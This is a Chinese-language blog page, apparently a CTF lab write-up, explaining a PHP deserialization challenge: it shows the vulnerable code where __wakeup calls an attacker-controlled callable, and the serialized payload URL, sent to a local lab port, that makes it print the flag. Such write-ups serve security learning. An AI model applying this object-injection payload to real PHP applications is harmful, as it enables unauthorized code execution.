@@ -1,0 +1,255 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PHP反序列化漏洞 | blacksmith's blog</title><meta name="author" content="Yse sir"><meta name="copyright" content="Yse sir"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="&#x2F;* 文章背景：深黑色带透明 *&#x2F; .post-body {     background-color: rgba(0, 0, 0, 0.85) !important;     padding: 20px;     border-radius: 8px; } &#x2F;* 代码块背景也调深一点 *&#x2F; .highlight, pre, code {     background-color: rgba(0">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化漏洞">
+<meta property="og:url" content="https://jxdj2jxhbd-tech.github.io/yes_sir.github.io/2026/08/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="blacksmith&#39;s blog">
+<meta property="og:description" content="&#x2F;* 文章背景：深黑色带透明 *&#x2F; .post-body {     background-color: rgba(0, 0, 0, 0.85) !important;     padding: 20px;     border-radius: 8px; } &#x2F;* 代码块背景也调深一点 *&#x2F; .highlight, pre, code {     background-color: rgba(0">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jxdj2jxhbd-tech.github.io/yes_sir.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2026-08-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-04T05:01:14.294Z">
+<meta property="article:author" content="Yse sir">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP反序列化">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jxdj2jxhbd-tech.github.io/yes_sir.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PHP反序列化漏洞",
+  "url": "https://jxdj2jxhbd-tech.github.io/yes_sir.github.io/2026/08/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/",
+  "image": "https://jxdj2jxhbd-tech.github.io/yes_sir.github.io/img/avatar.jpg",
+  "datePublished": "2026-08-03T16:00:00.000Z",
+  "dateModified": "2026-08-04T05:01:14.294Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Yse sir",
+      "url": "https://jxdj2jxhbd-tech.github.io/yes_sir.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/yes_sir.github.io/img/favicon.png"><link rel="canonical" href="https://jxdj2jxhbd-tech.github.io/yes_sir.github.io/2026/08/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/yes_sir.github.io/css/index.css?v=5.6.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/yes_sir.github.io/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PHP反序列化漏洞',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 8.1.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/yes_sir.github.io/img/avatar.jpg" onerror="this.onerror=null;this.src='/yes_sir.github.io/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/yes_sir.github.io/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/yes_sir.github.io/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/yes_sir.github.io/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/yes_sir.github.io/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/yes_sir.github.io/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/yes_sir.github.io/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/yes_sir.github.io/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/yes_sir.github.io/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/yes_sir.github.io/"><span class="site-name">blacksmith's blog</span></a><a class="nav-page-title" href="/yes_sir.github.io/"><span class="site-name">PHP反序列化漏洞</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/yes_sir.github.io/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/yes_sir.github.io/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/yes_sir.github.io/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/yes_sir.github.io/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/yes_sir.github.io/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">PHP反序列化漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-08-03T16:00:00.000Z" title="发表于 2026-08-04 00:00:00">2026-08-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-04T05:01:14.294Z" title="更新于 2026-08-04 13:01:14">2026-08-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/yes_sir.github.io/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><style>
+/* 文章背景：深黑色带透明 */
+.post-body {
+    background-color: rgba(0, 0, 0, 0.85) !important;
+    padding: 20px;
+    border-radius: 8px;
+}
+/* 代码块背景也调深一点 */
+.highlight, pre, code {
+    background-color: rgba(0, 0, 0, 0.6) !important;
+}
+/* 正文文字颜色调亮，不然看不清 */
+.post-body p, .post-body li, .post-body h1, .post-body h2, .post-body h3 {
+    color: #e0e0e0 !important;
+}
+</style>
+
+<h2 id="今日学习内容：PHP反序列化漏洞实战"><a href="#今日学习内容：PHP反序列化漏洞实战" class="headerlink" title="今日学习内容：PHP反序列化漏洞实战"></a>今日学习内容：PHP反序列化漏洞实战</h2><p><strong>题目出处</strong>：西安电子科技大学 CTF 平台 - Web安全审计 - phptrick</p>
+<hr>
+<h3 id="第一步：连接靶场环境"><a href="#第一步：连接靶场环境" class="headerlink" title="第一步：连接靶场环境"></a>第一步：连接靶场环境</h3><p>通过 WSRX 工具连接靶场，访问本地端口进入题目页面。</p>
+<img src="/yes_sir.github.io/2026/08/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png" class="" title="题目源码截图">
+
+<hr>
+<h3 id="第二步：分析PHP代码"><a href="#第二步：分析PHP代码" class="headerlink" title="第二步：分析PHP代码"></a>第二步：分析PHP代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public function test() &#123;</span><br><span class="line">        echo getenv(&#x27;FLAG&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B &#123;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        ($this-&gt;c)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;data&#x27;])) &#123;</span><br><span class="line">    $data = unserialize($_GET[&#x27;data&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析得出<br>· A::test() 输出 flag<br>· B::__wakeup() 会自动执行 $c<br>· $_GET[‘data’] 是我可控的输入</p>
+<p>如果我想让服务器执行 A::test()，</p>
+<p>不能直接调用，因为代码里没写。</p>
+<p>而B 的 __wakeup() 会执行 $c，所以我需要让 $c &#x3D; [A对象, ‘test’]。</p>
+<h3 id="把页面源码改成能在在线网站上生成-Payload-的代码"><a href="#把页面源码改成能在在线网站上生成-Payload-的代码" class="headerlink" title="把页面源码改成能在在线网站上生成 Payload 的代码"></a>把页面源码改成能在在线网站上生成 Payload 的代码</h3><p> ☠&gt; <strong>备注</strong>：deepseek帮我写，我不会</p>
+<hr>
+<img src="/yes_sir.github.io/2026/08/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/6.png" class="" title="d老师构造 我不太会写">
+
+<hr>
+<blockquote>
+<p><strong>备注</strong>：将脚本放入 3v4l.org 中进行在线解payload。</p>
+</blockquote>
+<hr>
+<img src="/yes_sir.github.io/2026/08/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/3.png" class="" title="序列化字符串在线解码结果">
+
+<hr>
+<p>验证解码结果与预期一致后，在浏览器中构造最终 Payload 访问：<br><a target="_blank" rel="noopener" href="http://127.0.0.1:58574/?data=O:1:%22B%22:1:%7Bs:1:%22c%22;a:2:%7Bi:0;O:1:%22A%22:0:%7B%7D;i:1;s:4:%22test%22;%7D%7D">http://127.0.0.1:58574/?data=O:1:&quot;B&quot;:1:{s:1:&quot;c&quot;;a:2:{i:0;O:1:&quot;A&quot;:0:{};i:1;s:4:&quot;test&quot;;}}</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">页面成功显示flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<img src="/yes_sir.github.io/2026/08/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/4.png" class="" title="得到flag">
+
+
+
+<hr>
+<h3 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h3><p>看源码 → 发现 __wakeup() 漏洞 → 本地构造 Payload → 提交 ?data&#x3D;… → 拿到 flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://jxdj2jxhbd-tech.github.io/yes_sir.github.io">Yse sir</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jxdj2jxhbd-tech.github.io/yes_sir.github.io/2026/08/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://jxdj2jxhbd-tech.github.io/yes_sir.github.io/2026/08/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://jxdj2jxhbd-tech.github.io/yes_sir.github.io" target="_blank">blacksmith's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/yes_sir.github.io/tags/CTF/">CTF</a><a class="post-meta__tags" href="/yes_sir.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHP反序列化</a><a class="post-meta__tags" href="/yes_sir.github.io/tags/web/">web</a></div><div class="post-share"><div class="social-share" data-image="/yes_sir.github.io/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/yes_sir.github.io/2026/08/03/%E8%B1%A1%E6%A3%8B%E7%8E%8B%E5%AD%90-JS%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86-1/" title="象棋王子 - JS代码混淆"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">象棋王子 - JS代码混淆</div></div><div class="info-2"><div class="info-item-1"> /* 强制全屏背景图 */ #body-wrap {     background: url(/img/SQGS.jpg) no-repeat center center fixed !important;     background-size: cover !important; }  /* 顶部标题区透明，显示背景图 */ #page-header {     background: transparent !important; }  /* 文章卡片半透明 */ #post {     background: rgba(10, 22, 40, 0.7) !important;     backdrop-filter: blur(12px) !important;     border-radius: 16px !important;     padding: 30px !important; }  .layout_page {     background: transparent !important; }  📌 题目信息   项目 内容    题目来源 VNCTF...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/yes_sir.github.io/2026/07/28/XSS%E6%97%A5%E6%8A%A5%E4%B8%80%E5%88%99/" title="XSS日报一则"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-28</div><div class="info-item-2">XSS日报一则</div></div><div class="info-2"><div class="info-item-1">一、练习概述 本次完成趣味丧尸主题XSS入门靶场训练，熟悉前端页面交互调试、控制台指令利用的基础思路，掌握简易页面逻辑篡改手段。 二、完整解题操作步骤  打开靶场游戏页面，等待游戏加载完成；  按下键盘ESC键，暂停当前游戏运行进程；  按下F12唤起浏览器开发者工具，切换至Console控制台面板；  在控制台输入指令 getflag(1000) 并回车执行；  页面直接输出对应flag，关卡通关。   三、学习小结 这道题目利用浏览器原生控制台执行页面内置函数，无需复杂XSS注入代码，通过暂停游戏+调用预设函数即可完成解题，理解了前端页面JS函数可在控制台直接调用的基础知识点。 </div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/yes_sir.github.io/img/avatar.jpg" onerror="this.onerror=null;this.src='/yes_sir.github.io/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Yse sir</div><div class="author-info-description">去看海 绕世界流浪</div><div class="site-data"><a href="/yes_sir.github.io/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/yes_sir.github.io/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/yes_sir.github.io/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/jxdj2jxhbd-tech"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/jxdj2jxhbd-tech" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://wpa.qq.com/msgrd?v=3&amp;uin=2416938302&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #12B7F5;"></i></a><a class="social-icon" href="mailto:2416938302@qq.com" target="_blank" title="邮箱"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客！😊</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8A%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%EF%BC%9APHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98"><span class="toc-number">1.</span> <span class="toc-text">今日学习内容：PHP反序列化漏洞实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E8%BF%9E%E6%8E%A5%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">第一步：连接靶场环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E5%88%86%E6%9E%90PHP%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">第二步：分析PHP代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%8A%E9%A1%B5%E9%9D%A2%E6%BA%90%E7%A0%81%E6%94%B9%E6%88%90%E8%83%BD%E5%9C%A8%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99%E4%B8%8A%E7%94%9F%E6%88%90-Payload-%E7%9A%84%E4%BB%A3%E7%A0%81"><span class="toc-number">1.3.</span> <span class="toc-text">把页面源码改成能在在线网站上生成 Payload 的代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">解题流程</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/yes_sir.github.io/2026/08/04/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP反序列化漏洞">PHP反序列化漏洞</a><time datetime="2026-08-03T16:00:00.000Z" title="发表于 2026-08-04 00:00:00">2026-08-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/yes_sir.github.io/2026/08/03/%E8%B1%A1%E6%A3%8B%E7%8E%8B%E5%AD%90-JS%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86-1/" title="象棋王子 - JS代码混淆">象棋王子 - JS代码混淆</a><time datetime="2026-08-03T06:45:03.000Z" title="发表于 2026-08-03 14:45:03">2026-08-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/yes_sir.github.io/2026/08/01/pwn%E5%AD%A6%E4%B9%A0%E6%97%A5%E6%8A%A5%E4%B8%80%E5%88%99/" title="pwn学习日报一则">pwn学习日报一则</a><time datetime="2026-08-01T03:08:09.000Z" title="发表于 2026-08-01 11:08:09">2026-08-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/yes_sir.github.io/2026/07/29/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%97%A5%E6%8A%A5/" title="博客搭建日报">博客搭建日报</a><time datetime="2026-07-29T03:33:57.000Z" title="发表于 2026-07-29 11:33:57">2026-07-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/yes_sir.github.io/2026/07/28/XSS%E6%97%A5%E6%8A%A5%E4%B8%80%E5%88%99/" title="XSS日报一则">XSS日报一则</a><time datetime="2026-07-28T05:26:41.000Z" title="发表于 2026-07-28 13:26:41">2026-07-28</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Yse sir</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.6.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/yes_sir.github.io/js/utils.js?v=5.6.2"></script><script src="/yes_sir.github.io/js/main.js?v=5.6.2"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/js/star-cursor.js"></script></body></html>
